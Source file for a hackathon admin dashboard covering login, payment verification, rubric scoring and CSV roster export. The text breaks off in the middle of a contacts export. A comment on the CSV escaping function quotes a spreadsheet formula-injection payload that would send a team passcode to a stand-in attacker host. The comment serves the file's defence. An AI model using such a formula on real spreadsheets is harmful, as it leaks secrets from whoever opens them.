'use client';

import React, { useState, useEffect, useCallback, useRef } from 'react';
import { 
  ShieldCheck, 
  Search, 
  Download, 
  CheckCircle2, 
  AlertTriangle, 
  XCircle, 
  Unlock, 
  RefreshCw, 
  ArrowLeft, 
  Sparkles, 
  Settings, 
  ListOrdered, 
  Eye, 
  Check, 
  FileCheck, 
  LogOut,
  ExternalLink,
  Globe,
  Copy,
  FileText,
  Code2,
  Star,
  Award,
  Save,
  Info,
  Mail,
  Trash2,
  CreditCard,
  Phone
} from 'lucide-react';
import Link from 'next/link';
import Image from 'next/image';
import type { TeamRecord, TeamMember, AuditLogRecord, SystemConfig, EvaluationScores } from '@/types/orion';
import { sound } from '@/audio/soundEffects';
import confetti from 'canvas-confetti';
import { PaymentReceiptModal } from '@/components/modals/PaymentReceiptModal';
import { CredentialsPanel } from '@/components/admin/CredentialsPanel';

// Not a credential: a flag saying "this tab logged in", so a reload can try to
// resume. The real session is the HttpOnly cookie, which JS cannot read.
const ADMIN_SESSION_HINT = 'orion_admin_session_active';

export interface AdminToast {
  id: string;
  type: 'success' | 'error' | 'warning' | 'info';
  title: string;
  message: string;
}

/**
 * Escape one CSV cell.
 *
 * Two separate problems this solves:
 *
 * 1. Formula injection. Registration is public, so a team can name itself
 *    `=HYPERLINK("https://evil.tld?d="&V2,"click")` and Excel will execute it
 *    when an organiser opens the roster — column V is the team passcode. Any
 *    cell starting with = + - @, tab or CR is prefixed with a single quote,
 *    which Excel and LibreOffice treat as "this is text".
 * 2. Delimiter breakage. Several columns were emitted unquoted, so one comma in
 *    a team name shifted every later column on that row — silently moving the
 *    passcode under a different heading.
 */
function csvCell(value: unknown): string {
  const s = value === null || value === undefined ? '' : String(value);
  const neutralised = /^[=+\-@\t\r]/.test(s) ? `'${s}` : s;
  return `"${neutralised.replace(/"/g, '""')}"`;
}

/**
 * The deck the jury evaluates: the ACCEPTED one, falling back to the newest for
 * records created before submission statuses existed.
 */
function activeSubmission(team: TeamRecord) {
  const round1 = (team.submissions || []).filter(s => s.round_number === 1);
  return round1.find(s => s.submission_status === 'ACCEPTED')
    || (round1.length > 0 ? round1[round1.length - 1] : null);
}

const RUBRIC_CATEGORIES = [
  {
    key: 'innovation' as const,
    num: '01',
    title: 'Technical Innovation & Novelty',
    desc: 'Uniqueness of concept, algorithmic approach, creative problem solving vs existing solutions.',
    color: '#00BCF2',
    accentClass: 'text-[#00BCF2] border-[#00BCF2]/40 bg-[#00BCF2]/10'
  },
  {
    key: 'architecture' as const,
    num: '02',
    title: 'System Architecture & Tech Depth',
    desc: 'Robustness of design, code quality, modularity, data pipelines, tech stack suitability & security.',
    color: '#38BDF8',
    accentClass: 'text-[#38BDF8] border-[#38BDF8]/40 bg-[#38BDF8]/10'
  },
  {
    key: 'impact' as const,
    num: '03',
    title: 'Problem Relevance & Real-World Impact',
    desc: 'Alignment with track problem statement, practical utility, quantifiable value & market feasibility.',
    color: '#10B981',
    accentClass: 'text-emerald-400 border-emerald-500/40 bg-emerald-950/40'
  },
  {
    key: 'execution' as const,
    num: '04',
    title: 'Implementation & PPT / Demo Quality',
    desc: 'Adherence to standardized template, deck clarity, live prototype / demo repo & execution depth.',
    color: '#F59E0B',
    accentClass: 'text-amber-400 border-amber-500/40 bg-amber-950/40'
  },
  {
    key: 'feasibility' as const,
    num: '05',
    title: 'Feasibility & 24H Sprint Roadmap',
    desc: 'Realistic milestone breakdown, viable 24H offline sprint buildability, and risk mitigations.',
    color: '#A855F7',
    accentClass: 'text-purple-400 border-purple-500/40 bg-purple-950/40'
  }
];

export default function AdminDashboard() {
  const fetchInFlightRef = useRef(false);
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [passcode, setPasscode] = useState('');
  const [authError, setAuthError] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const [activeTab, setActiveTab] = useState<'TEAMS' | 'CREDENTIALS' | 'AUDIT_LOGS' | 'SETTINGS'>('TEAMS');

  // Dashboard Data State
  const [teams, setTeams] = useState<TeamRecord[]>([]);
  const [auditLogs, setAuditLogs] = useState<AuditLogRecord[]>([]);
  const [, setConfig] = useState<SystemConfig | null>(null);
  const [stats, setStats] = useState({
    totalRegistrations: 0,
    paymentVerified: 0,
    paymentPending: 0,
    paymentRejected: 0,
    paymentResubmission: 0,
    round1Submissions: 0,
    round1PendingReview: 0,
    round1Selected: 0,
    round1NotSelected: 0,
    reuploadRequestsPending: 0,
    totalRevenue: 0,
    countByTrack: {} as Record<string, number>
  });

  // Filters & Search
  const [searchQuery, setSearchQuery] = useState('');
  const [selectedTrack, setSelectedTrack] = useState('ALL');
  const [selectedPaymentStatus, setSelectedPaymentStatus] = useState('ALL');
  const [selectedRoundStatus, setSelectedRoundStatus] = useState('ALL');
  const [selectedRatingFilter, setSelectedRatingFilter] = useState('ALL');
  const [onlySuspicious, setOnlySuspicious] = useState(false);

  // Selected Team for Detail Modal
  const [selectedTeam, setSelectedTeam] = useState<TeamRecord | null>(null);
  const [isReceiptModalOpen, setIsReceiptModalOpen] = useState(false);

  // Action Loading State & Toast System
  const [activeActionKey, setActiveActionKey] = useState<string | null>(null);
  const [isCheckingMailer, setIsCheckingMailer] = useState(false);
  const [isRecordFormOpen, setIsRecordFormOpen] = useState(false);
  const [isRecordingPayment, setIsRecordingPayment] = useState(false);
  const [recordUtr, setRecordUtr] = useState('');
  const [recordPayerName, setRecordPayerName] = useState('');
  const [recordPayerUpi, setRecordPayerUpi] = useState('');
  const [recordScreenshotFile, setRecordScreenshotFile] = useState<File | null>(null);
  const [toasts, setToasts] = useState<AdminToast[]>([]);

  const showToast = useCallback((type: 'success' | 'error' | 'warning' | 'info', title: string, message: string) => {
    const id = Date.now().toString() + Math.random().toString(36).slice(2, 5);
    setToasts(prev => [...prev, { id, type, title, message }]);
    setTimeout(() => {
      setToasts(prev => prev.filter(t => t.id !== id));
    }, 5000);
  }, []);

  const removeToast = (id: string) => {
    setToasts(prev => prev.filter(t => t.id !== id));
  };

  // Rubric Scores State (5 categories each 0-10)
  const [rubricScores, setRubricScores] = useState({
    innovation: 7,
    architecture: 7,
    impact: 7,
    execution: 7,
    feasibility: 7
  });

  const totalRubricScore = Math.min(
    50,
    Math.max(
      0,
      Number(rubricScores.innovation || 0) +
      Number(rubricScores.architecture || 0) +
      Number(rubricScores.impact || 0) +
      Number(rubricScores.execution || 0) +
      Number(rubricScores.feasibility || 0)
    )
  );

  // Action Form States inside Modal
  const [adminNoteInput, setAdminNoteInput] = useState('');
  // Note attached to a re-upload approve/reject decision; emailed to the team.
  const [reuploadDecisionNote, setReuploadDecisionNote] = useState('');
  const [actionSuccessMsg, setActionSuccessMsg] = useState('');
  const [copiedUrl, setCopiedUrl] = useState<string | null>(null);

  // Synchronize Rubric Scores when opening a team
  const syncRubricScores = (team: TeamRecord | null) => {
    if (!team) return;
    if (team.evaluation_scores) {
      setRubricScores({
        innovation: Math.min(10, Math.max(0, Number(team.evaluation_scores.innovation) || 0)),
        architecture: Math.min(10, Math.max(0, Number(team.evaluation_scores.architecture) || 0)),
        impact: Math.min(10, Math.max(0, Number(team.evaluation_scores.impact) || 0)),
        execution: Math.min(10, Math.max(0, Number(team.evaluation_scores.execution) || 0)),
        feasibility: Math.min(10, Math.max(0, Number(team.evaluation_scores.feasibility) || 0))
      });
    } else if (team.round_1_score !== null && team.round_1_score !== undefined) {
      const val = Math.min(10, Math.max(0, Math.round(Number(team.round_1_score) / 5)));
      setRubricScores({
        innovation: val,
        architecture: val,
        impact: val,
        execution: val,
        feasibility: val
      });
    } else {
      setRubricScores({
        innovation: 7,
        architecture: 7,
        impact: 7,
        execution: 7,
        feasibility: 7
      });
    }
  };

  const handleSelectTeam = (team: TeamRecord | null) => {
    if (team) {
      syncRubricScores(team);
    }
    // Clear drafts tied to the previously open team. `adminNoteInput` persisted
    // across selections, so a note typed for team A and left unsaved would be
    // written onto team B on the next SAVE NOTE.
    setSelectedTeam(prev => {
      const changed =
        !team || !prev || (prev.id !== team.id && prev.registration_id !== team.registration_id);
      if (changed) {
        setAdminNoteInput(team?.admin_notes || '');
        setReuploadDecisionNote('');
      }
      return team;
    });
  };

  const handleCopyUrl = (url: string, e?: React.MouseEvent) => {
    if (e) e.stopPropagation();
    navigator.clipboard.writeText(url);
    setCopiedUrl(url);
    setTimeout(() => setCopiedUrl(null), 2000);
  };

  // Settings Form State
  const [settingsForm, setSettingsForm] = useState<Partial<SystemConfig>>({});
  const [isSavingSettings, setIsSavingSettings] = useState(false);

  // Resubmission Modal State
  const [isResubmitModalOpen, setIsResubmitModalOpen] = useState(false);
  const [resubmitComment, setResubmitComment] = useState('Payment reference unclear. Please provide valid 12-digit UTR reference.');
  const [resubmitTeam, setResubmitTeam] = useState<TeamRecord | null>(null);

  // Delete Confirmation Modal State
  const [isDeleteModalOpen, setIsDeleteModalOpen] = useState(false);
  const [deleteConfirmInput, setDeleteConfirmInput] = useState('');
  const [hasCheckedDeleteWarning, setHasCheckedDeleteWarning] = useState(false);
  const [teamToDelete, setTeamToDelete] = useState<TeamRecord | null>(null);

  // Forgiving on case and whitespace: the confirmation exists to prevent
  // ACCIDENTAL deletion, not to fail people whose phone keyboard lowercased
  // the ID — a strict === left the purge button permanently disabled with no
  // explanation.
  const deleteIdMatches =
    teamToDelete !== null &&
    deleteConfirmInput.replace(/\s+/g, '').toUpperCase() ===
      teamToDelete.registration_id.replace(/\s+/g, '').toUpperCase();

  // Fetch admin data helper
  // Returns the freshly loaded teams so callers can re-sync the open drawer.
  // Auth rides on the HttpOnly session cookie set by /api/admin/session, so
  // nothing here has to hold the admin secret. `credentials: 'same-origin'` is
  // the default for same-origin fetches but is stated explicitly: this request
  // is worthless without the cookie.
  const fetchAdminData = useCallback(async (isSilent = false): Promise<TeamRecord[] | null> => {
    if (fetchInFlightRef.current) return null;
    fetchInFlightRef.current = true;
    if (!isSilent) setIsLoading(true);
    try {
      const res = await fetch('/api/admin/registrations', {
        credentials: 'same-origin'
      });

      if (res.status === 401) {
        sessionStorage.removeItem(ADMIN_SESSION_HINT);
        setIsAuthenticated(false);
        setAuthError('Session expired. Please enter passcode again.');
        return null;
      }

      const json = await res.json();
      if (json.success) {
        const loadedTeams: TeamRecord[] = json.teams || [];
        setTeams(loadedTeams);
        setAuditLogs(json.auditLogs || []);
        if (json.config) {
          setConfig(json.config);
          setSettingsForm(json.config);
        }
        setStats(json.stats || {
          totalRegistrations: 0,
          paymentVerified: 0,
          paymentPending: 0,
          paymentRejected: 0,
          paymentResubmission: 0,
          round1Submissions: 0,
          round1PendingReview: 0,
          round1Selected: 0,
          round1NotSelected: 0,
          // Was missing here, so on a stats-less response the RE-UPLOAD REQ tile
          // rendered `undefined` and pending requests went unnoticed.
          reuploadRequestsPending: 0,
          totalRevenue: 0,
          countByTrack: {}
        });
        setIsAuthenticated(true);
        return loadedTeams;
      }
    } catch (err) {
      console.error('Failed to load admin data:', err);
    } finally {
      fetchInFlightRef.current = false;
      if (!isSilent) setIsLoading(false);
    }
    return null;
  }, []);

  // Restore an existing session after a reload. The cookie is HttpOnly and so
  // invisible to this code; the sessionStorage flag is only a hint that saves a
  // pointless round trip for a visitor who never logged in. The server decides.
  useEffect(() => {
    if (typeof window === 'undefined') return;
    if (!sessionStorage.getItem(ADMIN_SESSION_HINT)) return;
    const timer = setTimeout(() => { fetchAdminData(); }, 0);
    return () => clearTimeout(timer);
  }, [fetchAdminData]);

  // Keep the operational view fresh without downloading the full overview in
  // background tabs. Admin actions and the manual refresh button still invoke
  // fetchAdminData immediately.
  useEffect(() => {
    if (!isAuthenticated) return;

    const refreshWhenVisible = () => {
      if (document.visibilityState === 'visible') fetchAdminData(true);
    };
    const interval = setInterval(() => {
      refreshWhenVisible();
    }, 60_000);
    document.addEventListener('visibilitychange', refreshWhenVisible);
    window.addEventListener('focus', refreshWhenVisible);

    return () => {
      clearInterval(interval);
      document.removeEventListener('visibilitychange', refreshWhenVisible);
      window.removeEventListener('focus', refreshWhenVisible);
    };
  }, [isAuthenticated, fetchAdminData]);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setAuthError('');
    setIsLoading(true);

    try {
      // Exchange the passcode for a session cookie. The passcode itself is
      // never stored — it used to sit in sessionStorage as the live value of
      // ADMIN_SECRET_KEY, readable by any script running on this origin.
      const res = await fetch('/api/admin/session', {
        method: 'POST',
        credentials: 'same-origin',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ passcode: passcode.trim() })
      });

      const json = await res.json();
      if (res.ok && json.authorized) {
        sessionStorage.setItem(ADMIN_SESSION_HINT, '1');
        setPasscode('');
        setIsAuthenticated(true);
        fetchAdminData();
      } else {
        setAuthError(json.error || 'Invalid passcode');
      }
    } catch {
      setAuthError('Connection error during authentication');
    } finally {
      setIsLoading(false);
    }
  };

  const handleLogout = () => {
    sound.playClick();
    sessionStorage.removeItem(ADMIN_SESSION_HINT);
    // Clear the cookie server-side; dropping local state alone would leave a
    // live session on a shared machine.
    fetch('/api/admin/session', { method: 'DELETE', credentials: 'same-origin' }).catch(() => {});
    setIsAuthenticated(false);
    setTeams([]);
  };

  const handleCredentialSessionExpired = useCallback(() => {
    sessionStorage.removeItem(ADMIN_SESSION_HINT);
    setIsAuthenticated(false);
    setTeams([]);
  }, []);

  // Perform Admin Action: Payment or Round 1 Evaluation
  const handleAdminAction = async (payload: {
    action: 'VERIFY_PAYMENT' | 'REJECT_PAYMENT' | 'REQUEST_PAYMENT_RESUBMISSION' | 'EVALUATE_ROUND_1' | 'ADD_NOTE' | 'RESEND_VERIFICATION_EMAIL' | 'SEND_REGISTRATION_EMAIL' | 'DELETE_TEAM' | 'DISPATCH_PAYMENT_REMINDERS' | 'APPROVE_REUPLOAD_REQUEST' | 'REJECT_REUPLOAD_REQUEST';
    teamId: string;
    decision?: 'SELECT' | 'NOT_SELECTED' | 'UNDER_REVIEW' | 'SAVE_SCORES';
    score?: number;
    evaluationScores?: EvaluationScores;
    reason?: string;
    note?: string;
    requestId?: string;
  }) => {
    const actionKey = `${payload.teamId}-${payload.action}-${payload.decision || ''}`;
    setActiveActionKey(actionKey);
    sound.playClick();
    setActionSuccessMsg('');

    try {
      const res = await fetch('/api/admin/registrations', {
        method: 'POST',
        credentials: 'same-origin',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      const json = await res.json();
      if (res.ok && json.success) {
        setActionSuccessMsg(json.message || 'Action saved successfully');
        setTimeout(() => setActionSuccessMsg(''), 4000);
        
        // Visual Feedback Toast & Sound
        if (payload.action === 'DELETE_TEAM') {
          sound.playClick();
          // teamId may be a UUID now — the server message names the human
          // registration ID of the row it actually deleted.
          showToast('error', 'Team Entry Purged', json.message || `Team ${payload.teamId} was permanently deleted from the database.`);
          setSelectedTeam(null);
          setTeams(prev => prev.filter(t => t.registration_id !== payload.teamId && t.id !== payload.teamId));
        } else if (payload.action === 'VERIFY_PAYMENT') {
          // The server reports the true mail outcome — a green "email
          // dispatched" toast over a 535 failure is how broken SMTP stayed
          // invisible for days.
          if (json.mail && !json.mail.sent) {
            sound.playClick();
            showToast('warning', 'Verified — Email NOT Sent', `Squad ${payload.teamId} is verified, but the confirmation ${json.mail.note}`);
          } else {
            sound.playSuccessCelebration();
            showToast('success', 'Payment Reconciled & Verified', `Payment verified for squad ${payload.teamId}. ${json.mail?.note || 'Confirmation email dispatched to team lead.'}`);
          }
        } else if (payload.action === 'RESEND_VERIFICATION_EMAIL') {
          sound.playClick();
          showToast('info', 'Confirmation Email Sent', `Verification email re-dispatched to squad ${payload.teamId}.`);
        } else if (payload.action === 'SEND_REGISTRATION_EMAIL') {
          sound.playClick();
          showToast('info', 'Registration Email Sent', `Registration confirmation dispatched to squad ${payload.teamId}.`);
        } else if (payload.action === 'APPROVE_REUPLOAD_REQUEST') {
          sound.playSuccessCelebration();
          showToast('success', 'Re-upload Approved', `Squad ${payload.teamId} may now upload one replacement deck. Notification email sent.`);
        } else if (payload.action === 'REJECT_REUPLOAD_REQUEST') {
          showToast('warning', 'Re-upload Declined', `Squad ${payload.teamId} keeps its existing submission. Notification email sent.`);
        } else if (payload.action === 'REJECT_PAYMENT') {
          showToast('error', 'Payment Rejected', `Payment marked as rejected for squad ${payload.teamId}.`);
        } else if (payload.action === 'REQUEST_PAYMENT_RESUBMISSION') {
          if (json.mail && !json.mail.sent) {
            showToast('warning', 'Resubmission Requested — Email NOT Sent', `Marked for resubmission, but the notice ${json.mail.note}`);
          } else {
            showToast('warning', 'Resubmission Requested', `Notification sent to squad ${payload.teamId} for 12-digit UTR reference.`);
          }
        } else if (payload.action === 'EVALUATE_ROUND_1') {
          if (payload.decision === 'SELECT') {
            confetti({
              particleCount: 80,
              spread: 70,
              origin: { y: 0.6 }
            });
            sound.playSuccessCelebration();
            showToast('success', 'Squad Selected for Round 2!', `Squad ${payload.teamId} selected with score ${payload.score}/50. Round 2 access granted.`);
          } else if (payload.decision === 'NOT_SELECTED') {
            showToast('warning', 'Squad Evaluation Updated', `Squad ${payload.teamId} marked as Not Selected.`);
          } else if (payload.decision === 'UNDER_REVIEW') {
            showToast('info', 'Status Set to Under Review', `Squad ${payload.teamId} is now under review.`);
          } else if (payload.decision === 'SAVE_SCORES') {
            sound.playClick();
            showToast('info', '5-Category Rubric Saved', `Evaluation breakdown (${payload.score}/50) recorded for ${payload.teamId}.`);
          }
        } else if (payload.action === 'DISPATCH_PAYMENT_REMINDERS') {
          sound.playClick();
          showToast('info', 'Payment Reminders Dispatched', json.message || 'Scanned and emailed unpaid squads.');
        } else if (payload.action === 'ADD_NOTE') {
          showToast('info', 'Note Appended', `Administrative audit note saved.`);
        }
        
        // Refresh admin data
        const refreshedTeams = await fetchAdminData(true);

        // Re-sync the open drawer from the admin payload. This used to call
        // /api/team/portal without a team token, which always 401s — so the
        // drawer silently kept showing pre-action state and admins would
        // re-click VERIFY thinking it had failed.
        if (refreshedTeams && selectedTeam && payload.action !== 'DELETE_TEAM') {
          const updated = refreshedTeams.find(
            t => t.id === selectedTeam.id || t.registration_id === selectedTeam.registration_id
          );
          if (updated) handleSelectTeam(updated);
        }
      } else {
        showToast('error', 'Operation Failed', json.error || 'Operation failed');
        alert(json.error || 'Operation failed');
      }
    } catch (err) {
      console.error('Admin action error:', err);
      showToast('error', 'Network Error', 'Error executing administrative command');
      alert('Error executing administrative command');
    } finally {
      setActiveActionKey(null);
    }
  };

  // One-click SMTP health check — verifies connection + credentials against
  // the CURRENT env without sending anything, so a broken mailer is visible
  // before the next live dispatch fails.
  const handleCheckMailer = async () => {
    sound.playClick();
    setIsCheckingMailer(true);
    try {
      const res = await fetch('/api/admin/registrations', {
        method: 'POST',
        credentials: 'same-origin',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: 'CHECK_MAILER' })
      });
      const json = await res.json();
      if (res.ok && json.success) {
        showToast('success', 'Mailer Healthy', json.message || 'SMTP connection and credentials verified.');
      } else {
        showToast('error', 'Mailer Check Failed', json.message || json.error || 'SMTP verification failed.');
      }
    } catch {
      showToast('error', 'Mailer Check Failed', 'Network error while testing SMTP.');
    } finally {
      setIsCheckingMailer(false);
    }
  };

  // Record an off-platform payment (the WhatsApp workflow): attach whatever
  // evidence the organiser has — UTR, payer, UPI, screenshot — and verify in
  // one action, so the payments ledger gets a real row.
  const handleRecordPayment = async () => {
    if (!selectedTeam) return;
    sound.playClick();
    setIsRecordingPayment(true);
    try {
      const fd = new FormData();
      fd.append('action', 'RECORD_PAYMENT');
      fd.append('teamId', selectedTeam.registration_id);
      if (recordUtr.trim()) fd.append('utrNumber', recordUtr.trim());
      if (recordPayerName.trim()) fd.append('payerName', recordPayerName.trim());
      if (recordPayerUpi.trim()) fd.append('payerUpi', recordPayerUpi.trim());
      if (recordScreenshotFile) fd.append('screenshot', recordScreenshotFile);

      const res = await fetch('/api/admin/registrations', {
        method: 'POST',
        credentials: 'same-origin',
        body: fd
      });
      const json = await res.json();
      if (!res.ok || !json.success) {
        throw new Error(json.error || 'Failed to record the payment');
      }

      if (json.mail && !json.mail.sent) {
        showToast('warning', 'Recorded & Verified — Email NOT Sent', `Evidence saved and squad verified, but the confirmation ${json.mail.note}`);
      } else {
        sound.playSuccessCelebration();
        showToast('success', 'Payment Recorded & Verified', json.message || 'Evidence recorded and squad verified.');
      }

      setRecordUtr('');
      setRecordPayerName('');
      setRecordPayerUpi('');
      setRecordScreenshotFile(null);
      setIsRecordFormOpen(false);

      const refreshed = await fetchAdminData(true);
      if (refreshed) {
        const updated = refreshed.find(t => t.id === selectedTeam.id || t.registration_id === selectedTeam.registration_id);
        if (updated) handleSelectTeam(updated);
      }
    } catch (err) {
      showToast('error', 'Record Failed', err instanceof Error ? err.message : 'Could not record the payment.');
    } finally {
      setIsRecordingPayment(false);
    }
  };

  // data: receipt URLs cannot be opened via <a href> — browsers block
  // top-frame navigation to data: — so decode to a Blob and open that.
  // The bulk roster ships inline receipts as the marker 'inline'; the real
  // bytes are fetched per team on click to keep the roster payload small.
  const openReceiptScreenshot = async (url: string, teamId?: string) => {
    sound.playClick();
    try {
      let target = url;
      if (url === 'inline' && teamId) {
        const res = await fetch('/api/admin/registrations', {
          method: 'POST',
          credentials: 'same-origin',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ action: 'GET_PAYMENT_SCREENSHOT', teamId })
        });
        const json = await res.json();
        if (!res.ok || !json.url) throw new Error(json.error || 'Could not load the screenshot');
        target = json.url;
      }
      if (target.startsWith('data:')) {
        const blob = await (await fetch(target)).blob();
        const objUrl = URL.createObjectURL(blob);
        window.open(objUrl, '_blank', 'noopener');
        setTimeout(() => URL.revokeObjectURL(objUrl), 60_000);
      } else {
        window.open(target, '_blank', 'noopener');
      }
    } catch (err) {
      showToast('error', 'Could Not Open Screenshot', err instanceof Error ? err.message : 'The stored receipt could not be decoded.');
    }
  };

  // Save System Settings
  const handleSaveSettings = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSavingSettings(true);
    try {
      const res = await fetch('/api/admin/config', {
        method: 'POST',
        credentials: 'same-origin',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ config: settingsForm })
      });
      const data = await res.json();
      if (res.ok && data.success) {
        setConfig(data.config);
        alert('System configuration updated successfully');
      }
    } catch (err) {
      console.error('Settings update error:', err);
    } finally {
      setIsSavingSettings(false);
    }
  };

  // Squad member deduplication: in ORION, `leader_name` is Participant 1.
  // Any member entry matching the leader's name, phone, or email is excluded
  // so the leader is never listed twice.
  const getAdditionalMembers = (team: TeamRecord | null | undefined): TeamMember[] => {
    if (!team || !team.members) return [];
    const norm = (s?: string) => (s || '').toLowerCase().replace(/[^a-z0-9]/g, '');
    const lPhone = (team.leader_phone || '').replace(/\D/g, '').slice(-10);
    const lEmail = (team.leader_email || '').trim().toLowerCase();

    const isNameEquivalent = (a?: string, b?: string): boolean => {
      if (!a || !b) return false;
      const cleanA = norm(a);
      const cleanB = norm(b);
      if (cleanA && cleanB && cleanA === cleanB) return true;

      const tokensA = a.toLowerCase().replace(/[^a-z0-9\s]/g, '').trim().split(/\s+/).filter(Boolean).sort().join(' ');
      const tokensB = b.toLowerCase().replace(/[^a-z0-9\s]/g, '').trim().split(/\s+/).filter(Boolean).sort().join(' ');
      if (tokensA && tokensB && tokensA === tokensB) return true;

      const initialsA = a.toLowerCase().replace(/[^a-z0-9\s]/g, '').trim().split(/\s+/).filter(w => w.length === 1);
      const initialsB = b.toLowerCase().replace(/[^a-z0-9\s]/g, '').trim().split(/\s+/).filter(w => w.length === 1);
      if (initialsA.length > 0 && initialsB.length > 0) {
        if (initialsA.sort().join('') !== initialsB.sort().join('')) return false;
      }

      const wordsA = a.toLowerCase().replace(/[^a-z0-9\s]/g, '').trim().split(/\s+/).filter(w => w.length > 1).sort().join(' ');
      const wordsB = b.toLowerCase().replace(/[^a-z0-9\s]/g, '').trim().split(/\s+/).filter(w => w.length > 1).sort().join(' ');
      if (wordsA && wordsB && wordsA === wordsB) return true;

      return false;
    };

    const seen = new Set<string>();
    const result: TeamMember[] = [];

    for (const m of team.members) {
      const mPhone = (m.member_phone || '').replace(/\D/g, '').slice(-10);
      const mEmail = (m.member_email || '').trim().toLowerCase();

      if (isNameEquivalent(m.member_name, team.leader_name)) continue;
      if (lPhone && mPhone && lPhone === mPhone && lPhone.length >= 10) continue;
      if (lEmail && mEmail && lEmail === mEmail) continue;

      if (result.some(prev => isNameEquivalent(prev.member_name, m.member_name))) continue;
      const key = `${(m.member_name || '').toLowerCase().trim()}|${mPhone || mEmail}`;
      if (seen.has(key)) continue;
      seen.add(key);

      result.push(m);
    }

    return result;
  };

  // Export to CSV
  //
  // Every failure in here used to be invisible: an empty roster returned
  // without a word, an exception died in the console, and even success gave
  // no signal. "The export button does nothing" is the reported symptom of
  // all three. The page already has a toast system — use it for each outcome.
  const handleExportCSV = () => {
    if (!teams.length) {
      showToast('warning', 'Nothing to Export', 'No team records are loaded yet. Hit SYNC and try again.');
      return;
    }

    try {
      const headers = [
        'Team ID',
        'Team Name',
        'Track',
        'Leader Name',
        'Leader Phone',
        'Leader Email',
        'Institution',
        'Department',
        'Year',
        'Payment Status',
        'UTR Number',
        'Payer Name',
        'Payer UPI',
        'Amount',
        'Payment Submitted At',
        'Verified By',
        'Verified At',
        'Screenshot Attached',
        'Suspicion Flags',
        'Round 1 Status',
        'Round 2 Status',
        'Score Total (/50)',
        'Score Percentage',
        'Innovation (/10)',
        'Architecture (/10)',
        'Impact (/10)',
        'Execution (/10)',
        'Feasibility (/10)',
        'Members Count',
        'Passcode',
        'Submission PPT URL',
        'Project / Demo Link',
        'Repo URL',
        'Registration Date'
      ];

      const rows = teams.map((t) => {
        const latestSub = activeSubmission(t);
        const scores = t.evaluation_scores;
        const totalScore = t.round_1_score !== null && t.round_1_score !== undefined ? Number(t.round_1_score) : '';
        const pct = totalScore !== '' ? `${Math.round((Number(totalScore) / 50) * 100)}%` : '';

        return [
          t.registration_id,
          t.team_name,
          t.problem_statement,
          t.leader_name,
          t.leader_phone,
          t.leader_email,
          t.institution,
          t.department || '',
          t.year || '',
          t.payment_status,
          // A VERIFIED team with no payment row was decided off-platform —
          // label it so blank evidence cells read as a known state, not a gap.
          t.payment?.utr_number || (t.payment_status === 'VERIFIED' ? 'VERIFIED_OFF_PLATFORM' : ''),
          t.payment?.payer_name || '',
          t.payment?.payer_upi || '',
          t.payment?.amount ?? '',
          t.payment?.submitted_at ? t.payment.submitted_at.replace('T', ' ').slice(0, 16) : '',
          t.payment?.verified_by || '',
          t.payment?.verified_at ? t.payment.verified_at.replace('T', ' ').slice(0, 16) : '',
          t.payment?.screenshot_url ? 'YES' : 'NO',
          // Labels a duplicate row with WHICH team it collides with, so the
          // sheet itself shows what to purge (e.g. DUPLICATE_EMAIL:ORION-2026-0284).
          (t.suspicion_flags || [])
            .map(f => (f.matched_team_id ? `${f.flag_type}:${f.matched_team_id}` : f.flag_type))
            .join('; '),
          t.round_1_status,
          t.round_2_status,
          totalScore,
          pct,
          scores?.innovation ?? '',
          scores?.architecture ?? '',
          scores?.impact ?? '',
          scores?.execution ?? '',
          scores?.feasibility ?? '',
          getAdditionalMembers(t).length + 1,
          t.access_token,
          latestSub?.file_url || '',
          latestSub?.project_url || '',
          latestSub?.repo_url || '',
          t.created_at ? t.created_at.split('T')[0] : ''
        ].map(csvCell);
      });

      const csvContent = [headers.map(csvCell).join(','), ...rows.map(e => e.join(','))].join('\r\n');

      // A Blob, not a data: URI. `encodeURI` leaves '#' unescaped, so a team named
      // "Team #1" silently truncated the download at that row; data: URIs also cap
      // out around 2 MB.
      const blob = new Blob(['﻿' + csvContent], { type: 'text/csv;charset=utf-8;' });
      const url = URL.createObjectURL(blob);
      const link = document.createElement('a');
      link.setAttribute('href', url);
      link.setAttribute('download', `ORION_Hackathon_Roster_${new Date().toISOString().split('T')[0]}.csv`);
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);

      // Revoke LATER, never synchronously. click() only queues the download;
      // the browser may not have started reading the blob yet, and revoking
      // the URL at that point aborts it with no error — the button just
      // "does nothing". A minute is comfortably past any download start.
      setTimeout(() => URL.revokeObjectURL(url), 60_000);

      showToast('success', 'Roster Exported', `Downloaded ${teams.length} team record${teams.length === 1 ? '' : 's'} as CSV.`);
    } catch (err) {
      console.error('[Admin] CSV export failed:', err);
      showToast('error', 'Export Failed', err instanceof Error ? err.message : 'Could not build the CSV file.');
    }
  };

  // Export a flat "who to call" sheet: one row per person (leader + every
  // member), with their name, phone number and which team they belong to.
  // The full roster export above is one row per TEAM with 30+ admin columns;
  // this is the opposite shape — one row per PERSON with just the columns
  // someone dialing down a contact list actually needs.
  const handleExportContactsCSV = () => {
    if (!teams.length) {
      showToast('warning', 'Nothing to Export', 'No team records are loaded yet. Hit SYNC and try again.');
      return;
    }

    try {
      const headers = ['Team ID', 'Team Name', 'Track', 'Role', 'Name', 'Phone Number', 'Email'];

      const rows: string[][] = [];
      for (const t of teams) {
        rows.push([
          t.registration_id,
          t.team_name,
          t.problem_statement,
          'Leader',
          t.leader_name,
          t.leader_phone,
          t.leader_email
        ].map(csvCell));

        const squadMembers = getAdditionalMembers(t);
        for (let idx = 0; idx < squadMembers.length; idx++) {
          const m = squadMembers[idx];
          rows.push([
            t.registration_id,
            t.team_name,
            t.problem_statement,
            `Member ${idx + 1}`,
            m.member_name,
            m.member_phone,
            m.member_email || ''
          ].map(csvCell));
        }
      }

      const totalPeople = rows.length;
      const csvContent = [headers.map(csvCell).join(','), ...rows.map(e => e.join(','))].join('\r\n');

      // Same Blob + delayed-revoke pattern as the roster export above — see
      // the comments there for why (data: URIs truncate on '#' and cap at ~2MB;
